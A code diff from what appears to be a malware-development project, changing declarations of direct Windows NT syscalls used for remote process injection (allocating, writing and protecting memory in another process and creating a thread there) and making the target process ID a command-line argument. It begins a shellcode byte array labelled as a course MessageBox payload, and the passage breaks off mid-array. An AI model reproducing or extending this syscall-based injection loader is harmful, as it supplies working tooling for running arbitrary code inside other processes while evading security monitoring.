@@ -67,14 +67,14 @@ EXTERN_C NTSTATUS NtAllocateVirtualMemory(
     IN ULONG AllocationType,
     IN ULONG Protect);
 
-EXTERN_C NTSTATUS NtWriteVirtualMemory(
+NTSTATUS NtWriteVirtualMemory(
     IN HANDLE ProcessHandle,
     IN PVOID BaseAddress,
     IN PVOID Buffer,
     IN SIZE_T NumberOfBytesToWrite,
     OUT PSIZE_T NumberOfBytesWritten OPTIONAL);
 
-EXTERN_C NTSTATUS NtCreateThreadEx(
+NTSTATUS NtCreateThreadEx(
     OUT PHANDLE ThreadHandle,
     IN ACCESS_MASK DesiredAccess,
     IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
@@ -87,7 +87,7 @@ EXTERN_C NTSTATUS NtCreateThreadEx(
     IN SIZE_T MaximumStackSize,
     IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);
 
-EXTERN_C NTSTATUS NtProtectVirtualMemory(
+NTSTATUS NtProtectVirtualMemory(
     IN HANDLE ProcessHandle,
     IN OUT PVOID* BaseAddress,
     IN OUT PSIZE_T RegionSize,
@@ -102,7 +102,7 @@ int main(int argc, char* argv[])
 {
     jm::init_syscalls_list();
 
-    DWORD pid = 4580;
+    DWORD pid = atoi(argv[1]);
     //sektor7 maldev msgboxw
     unsigned char update[] = {
   0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
